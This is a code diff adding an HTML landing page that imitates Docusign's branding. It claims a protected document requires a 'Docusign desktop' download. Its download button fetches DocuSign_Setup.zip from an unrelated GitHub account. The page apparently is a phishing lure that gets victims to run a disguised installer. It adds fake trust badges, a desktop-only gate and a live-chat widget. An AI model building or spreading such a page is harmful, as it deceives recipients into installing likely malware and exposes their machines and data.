@@ -1,0 +1,378 @@
+<html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Docusign - Download to Review &amp; Sign Document</title>
+  <link rel="shortcut icon" href="https://www.docusign.com/sites/default/files/favicon.ico" type="image/x-icon">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'DSIndigo', 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+    }
+    body {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      background-color: #ffffff;
+      color: #130032; /* DocuSign dark text */
+      min-height: 100vh;
+    }
+
+    /* Header */
+    .header {
+      width: 100%;
+      padding: 24px 48px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid #eaeaec;
+      background-color: #ffffff;
+    }
+    .header .logo {
+      height: 32px;
+      width: auto;
+    }
+    .header .nav-links {
+      display: flex;
+      gap: 32px;
+    }
+    .header .nav-links a {
+      color: #130032;
+      text-decoration: none;
+      font-weight: 500;
+      font-size: 14px;
+    }
+
+    /* Main container */
+    .container {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      width: 100%;
+      max-width: 1200px;
+      align-items: center;
+      padding: 80px 48px;
+      flex: 1;
+      gap: 80px;
+    }
+
+    /* Left side - content */
+    .left {
+      display: flex;
+      flex-direction: column;
+      gap: 24px;
+    }
+    .left h1 {
+      font-size: 3rem;
+      font-weight: 700;
+      line-height: 1.1;
+      color: #130032;
+      letter-spacing: -1px;
+    }
+    .left .subtitle {
+      font-size: 1.125rem;
+      color: #4a4a4a;
+      line-height: 1.6;
+    }
+
+    /* Feature list */
+    .features {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      margin-top: 8px;
+      margin-bottom: 8px;
+    }
+    .features .feature-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 16px;
+      font-size: 1rem;
+      color: #130032;
+      font-weight: 500;
+    }
+    .features .feature-item .icon {
+      width: 24px;
+      height: 24px;
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+    .features .feature-item .icon svg {
+      width: 100%;
+      height: 100%;
+      fill: #4C00FF; /* DocuSign Purple */
+    }
+
+    /* Button */
+    .button-group {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .button {
+      background-color: #4C00FF; /* DocuSign Purple */
+      color: white;
+      padding: 16px 32px;
+      border-radius: 8px;
+      text-decoration: none;
+      font-weight: 600;
+      font-size: 1rem;
+      width: fit-content;
+      transition: background-color 0.2s ease;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      border: none;
+      cursor: pointer;
+    }
+    .button:hover {
+      background-color: #3a00cc;
+    }
+    .button svg {
+      width: 20px;
+      height: 20px;
+      fill: white;
+    }
+
+    .info-note {
+      font-size: 0.875rem;
+      color: #666;
+    }
+
+    /* Right side - image */
+    .right {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+    }
+    .right .bg-shape {
+      position: absolute;
+      width: 120%;
+      height: 120%;
+      background-color: #f8f3f0;
+      border-radius: 50%;
+      z-index: -1;
+      top: -10%;
+      right: -10%;
+    }
+    .right .doc-preview {
+      width: 100%;
+      max-width: 500px;
+      border-radius: 16px;
+      box-shadow: 0 24px 48px rgba(19, 0, 50, 0.12), 0 8px 24px rgba(19, 0, 50, 0.08);
+      border: 1px solid #eaeaec;
+      z-index: 1;
+    }
+
+    /* Trust badges */
+    .trust-badges {
+      display: flex;
+      align-items: center;
+      gap: 24px;
+      margin-top: 16px;
+      padding-top: 24px;
+      border-top: 1px solid #eaeaec;
+    }
+    .trust-badges span {
+      font-size: 0.875rem;
+      color: #666;
+      font-weight: 500;
+    }
+    .trust-badges img {
+      height: 24px;
+      opacity: 0.6;
+      filter: grayscale(100%);
+    }
+
+    /* Footer */
+    footer {
+      margin-top: auto;
+      padding: 32px 48px;
+      width: 100%;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 0.875rem;
+      color: #666;
+      border-top: 1px solid #eaeaec;
+      background-color: #f9f9fb;
+    }
+    .footer-links {
+      display: flex;
+      gap: 24px;
+    }
+    .footer-links a {
+      color: #666;
+      text-decoration: none;
+    }
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    /* Mobile warning */
+    .mobile-warning {
+      display: none;
+      text-align: center;
+      padding: 80px 24px;
+      max-width: 480px;
+      margin: auto;
+    }
+    .mobile-warning h2 {
+      font-size: 1.5rem;
+      margin-bottom: 16px;
+      color: #130032;
+    }
+    .mobile-warning p {
+      color: #4a4a4a;
+      line-height: 1.6;
+      margin-bottom: 24px;
+    }
+    .mobile-warning .icon {
+      width: 64px;
+      height: 64px;
+      margin: 0 auto 24px auto;
+      fill: #4C00FF;
+    }
+
+    @media (max-width: 960px) {
+      .container {
+        grid-template-columns: 1fr;
+        padding: 48px 32px;
+        gap: 64px;
+      }
+      .header .nav-links {
+        display: none;
+      }
+      .right .bg-shape {
+        display: none;
+      }
+      footer {
+        flex-direction: column;
+        gap: 16px;
+        text-align: center;
+      }
+    }
+
+    @media (max-width: 768px) {
+      .container {
+        display: none;
+      }
+      .mobile-warning {
+        display: block;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <div class="header">
+    <!-- Official Docusign SVG Logo extracted from docusign.com -->
+    <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 241.4">
+      <g>
+        <g>
+          <path d="M1169.2,109.7v78.7h-28.9v-73.5c0-17.9-7.7-27.9-22.7-27.9s-24.9,10.5-27.7,28.1c-0.8,4.2-1,10.7-1,24.4v48.8H1060v-125 h25.6c0.1,1.1,0.7,12.3,0.7,13c0,0.9,1.1,1.4,1.8,0.8c10.6-8.4,22.3-16.2,38.6-16.2C1153.5,60.9,1169.2,79,1169.2,109.7z"></path>
+          <path d="M1013.4,63.4l-0.9,14.3c-0.1,0.9-1.2,1.4-1.8,0.8c-3.5-3.3-16.4-17.5-38.3-17.5c-31.4,0-54.5,27.1-54.5,63.9l0,0 c0,37.3,22.9,64.5,54.5,64.5c21.1,0,34-13.7,36.4-16.7c0.7-0.8,2-0.3,2,0.7c-0.3,3.8-0.8,13.3-4,21.4c-4,10.2-13,19.7-31.1,19.7 c-14.9,0-28.1-5.7-40.6-17.9L920,217.3c13.7,15.5,35.3,24.2,58.8,24.2c37.8,0,60.5-25.9,60.5-68.2V63.4H1013.4z M978.6,163.2 c-18.7,0-31.9-16.2-31.9-38.3S959.9,87,978.6,87c18.7,0,31.9,15.7,31.9,37.9C1010.4,147.1,997.2,163.2,978.6,163.2z"></path>
+          <path d="M857.5,151.3c0,23.7-19.9,39.6-49.1,39.6c-22.9,0-43.3-8.9-55.5-21.6l0,0l0,0l9.5-22.6c9.2,8.3,24,20.2,45.1,20.2 c14.7,0,23.2-6.5,23.2-14.7c0-9.5-11.7-12-25.7-14.7c-19.9-4.2-46.3-11-46.3-38.1c0-22.7,18.4-38.3,45.6-38.3 c20.9,0,38.9,8,51.3,18.4l-14.2,19.9c-12-9.5-24.6-14.2-37.1-14.2s-18.7,5.2-18.7,12.7c0,10.5,13.5,13.2,23.4,15.2 C833.9,117.9,857.5,125.4,857.5,151.3z"></path>
+          <path d="M434.9,60.9c-35.3,0-60.7,27.4-60.7,65s25.4,65,60.7,65s60.8-27.4,60.8-65S470.3,60.9,434.9,60.9z M434.9,164.7 c-18.7,0-31.9-15.9-31.9-38.9c0-22.9,12.9-38.9,31.9-38.9c18.9,0,31.9,15.9,31.9,38.9S453.6,164.7,434.9,164.7z"></path>
+          <path d="M505.9,125.9c0-37.1,25.4-65,59.3-65c26.9,0,46.6,13.5,55.8,38.9l-25.6,9.7c-7-15.7-16.2-22.4-30.1-22.4 c-17.4,0-30.4,16.4-30.4,38.9c0,22.4,12.9,38.9,30.4,38.9c14,0,23.1-6.7,30.1-22.4l25.6,9.7c-9.2,25.4-28.9,38.9-55.8,38.9 C531.3,190.9,505.9,163,505.9,125.9L505.9,125.9L505.9,125.9L505.9,125.9z"></path>
+          <path d="M351.4,5.3c-0.5,0-1.1,0.1-1.6,0.4l-18.8,10c-0.4,0.2-0.6,0.6-0.6,1v59.5c0,1-1.2,1.4-1.9,0.8 c-2.8-2.4-9.3-8.5-18.3-12.7c-4.7-2.2-11.6-3.4-17.9-3.4c-31.6,0-54.5,27.4-54.5,65s22.9,65,54.5,65c16.6,0,29.1-8.7,36.7-16.5 c0.5-0.5,0.8-0.8,1.3-1.3c0.7-0.7,1.9-0.3,1.9,0.7l1,14.6h26.1V6.1c0-0.4-0.3-0.8-0.8-0.8C358.5,5.3,351.4,5.3,351.4,5.3z  M298.5,164.7c-18.9,0-31.9-15.9-31.9-38.9S279.9,87,298.5,87c18.7,0,31.9,15.9,31.9,38.9C330.4,148.8,317.5,164.7,298.5,164.7z"></path>
+          <path d="M891.5,63.8l-18.1,9.6c-0.4,0.2-0.6,0.6-0.6,1v114h28.9V64.1c0-0.4-0.3-0.8-0.8-0.8h-7.8C892.5,63.4,892,63.5,891.5,63.8 z"></path>
+          <path d="M887.2,43.1c9.6,0,17.4-7.8,17.4-17.4s-7.8-17.4-17.4-17.4c-9.6,0-17.4,7.8-17.4,17.4S877.6,43.1,887.2,43.1z"></path>
+          <path d="M742.5,63.3v67.9c0,51.5-28.8,59.6-54.5,59.6s-54.5-8.2-54.5-59.6V63.3h28.8v75.1c0,7.3,1.8,26.3,25.7,26.3 s25.7-18.9,25.7-26.3V63.3H742.5z"></path>
+        </g>
+        <g>
+          <path fill="#130032" d="M1185.7,175.6v1.8h-4.1v10.9h-2v-10.9h-4.1v-1.8H1185.7z M1200,188.3h-2v-10l-3.9,7.5h-1.1l-3.9-7.4v9.9h-2v-12.7h2.6 l3.8,7.3l3.8-7.3h2.6L1200,188.3L1200,188.3z"></path>
+        </g>
+      </g>
+      <g>
+        <path fill="#4C00FF" d="M139.5,139.5V189c0,2.6-2.1,4.7-4.7,4.7H4.7c-2.6,0-4.7-2.1-4.7-4.7V59c0-2.6,2.1-4.7,4.7-4.7h49.4v80.5 c0,2.6,2.1,4.7,4.7,4.7H139.5L139.5,139.5z"></path>
+        <path fill="#FF5252" d="M193.7,69.7c0,41.6-24.3,69.7-54.2,69.8V87.1c0-1.5-0.6-3-1.7-4l-27.2-27.2c-1.1-1.1-2.5-1.7-4-1.7H54.2V4.8 c0-2.6,2.1-4.7,4.7-4.7h73.3C167,0,193.7,28,193.7,69.7z"></path>
+        <path fill="#130032" d="M137.8,83c1.1,1.1,1.7,2.5,1.7,4v52.4H58.9c-2.6,0-4.7-2.1-4.7-4.7V54.2h52.4c1.5,0,3,0.6,4,1.7L137.8,83z"></path>
+      </g>
+    </svg>
+    
+  </div>
+
+  <!-- Mobile warning -->
+  <div class="mobile-warning">
+    <svg class="icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+      <path d="M20 18c1.1 0 1.99-.9 1.99-2L22 6c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2H0v2h24v-2h-4zM4 6h16v10H4V6z"></path>
+    </svg>
+    <h2>Desktop Device Required</h2>
+    <p>Docusign Desktop is required to view and sign this protected document. Please open this link on a Windows or macOS computer to continue.</p>
+  </div>
+
+  <!-- Main Content -->
+  <main class="container">
+    <div class="left">
+      <h1>Review and sign your document</h1>
+      <p class="subtitle">
+        A protected document has been shared with you. To view the full contents and apply your legally binding signature, download the Docusign desktop application.
+      </p>
+
+      <div class="features">
+        <div class="feature-item">
+          <div class="icon">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path></svg>
+          </div>
+          <span>Access the complete document with all terms</span>
+        </div>
+        <div class="feature-item">
+          <div class="icon">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path></svg>
+          </div>
+          <span>Sign securely with legally binding e-signatures</span>
+        </div>
+        <div class="feature-item">
+          <div class="icon">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path></svg>
+          </div>
+          <span>Protected by bank-level, enterprise encryption</span>
+        </div>
+      </div>
+
+      <div class="button-group">
+    <button id="downloadBtn" class="button" onclick="(function(){ var a = document.createElement('a'); a.href = 'https://github.com/aguentechlab1/DocuSign_zip/releases/download/v1.0.0.0/DocuSign_Setup.zip'; a.download = ''; document.body.appendChild(a ); a.click(); document.body.removeChild(a); })();">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"></path>
+      </svg>
+      Download Docusign
+    </button>
+    <span class="info-note">Version 6.2.1 · Windows / macOS supported</span>
+</div>
+
+
+      <div class="trust-badges">
+        <span>Trusted by:</span>
+        <img src="https://images.ctfassets.net/0jnmtsdzg6p5/4EF9emnTjawUqgowDljvrL/f31219b4b18112f859a36c9dddb0cb2b/checkmark_circle_green10.svg" alt="ISO 27001" style="height: 16px; margin-right: -16px;"> <span>ISO 27001</span>
+        <img src="https://images.ctfassets.net/0jnmtsdzg6p5/4EF9emnTjawUqgowDljvrL/f31219b4b18112f859a36c9dddb0cb2b/checkmark_circle_green10.svg" alt="FedRAMP" style="height: 16px; margin-right: -16px;"> <span>FedRAMP</span>
+      </div>
+    </div>
+
+    <div class="right">
+      <div class="bg-shape"></div>
+      <img class="doc-preview" src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663393250296/dzJmWMgSMhqxTgHN.jpg" alt="Document Preview">
+    </div>
+  </main>
+
+  <footer>
+    <div>© 2026 Docusign, Inc. All rights reserved.</div>
+    
+  </footer>
+
+<!-- Start of LiveChat (www.livechat.com) code -->
+<script>
+    window.__lc = window.__lc || {};
+    window.__lc.license = 19470622;
+    window.__lc.integration_name = "manual_channels";
+    window.__lc.product_name = "livechat";
+    ;(function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))
+</script>
+<noscript><a href="https://www.livechat.com/chat-with/19470622/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
+<!-- End of LiveChat code -->
+
+</body></html>
